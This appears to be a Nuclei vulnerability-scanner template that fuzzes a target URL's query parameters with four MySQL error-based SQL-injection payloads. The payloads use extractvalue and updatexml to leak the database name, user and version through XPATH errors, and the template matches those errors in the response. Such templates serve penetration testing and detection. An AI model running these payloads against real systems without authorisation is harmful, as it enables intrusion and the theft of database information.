id: nawab-confirmed-sqli-bypass

info:
  name: Nawab-Validated-SQLi-WAF-Bypass
  author: thenawabx
  severity: critical
  description: Validated SQL Injection using XPATH error-based leakage patterns.

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    payloads:
      sqli_payloads:
        - "1' AND (extractvalue(1,concat(0x7e,(SELECT database()),0x7e)))--"
        - "1\" AND (extractvalue(1,concat(0x7e,(SELECT user()),0x7e)))--"
        - "1' AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1))--"
        - "1' AND 1=(SELECT 1 FROM (SELECT(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))))x)--"

    fuzzing:
      - part: query
        type: replace
        fuzz:
          - "{{sqli_payloads}}"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "XPATH syntax error: '~[a-zA-Z0-9_\\-]+~'"
        part: body

      - type: word
        words:
          - "XPATH syntax error"
          - "updatexml"
        condition: or
        part: body

      - type: status
        status:
          - 200
          - 500
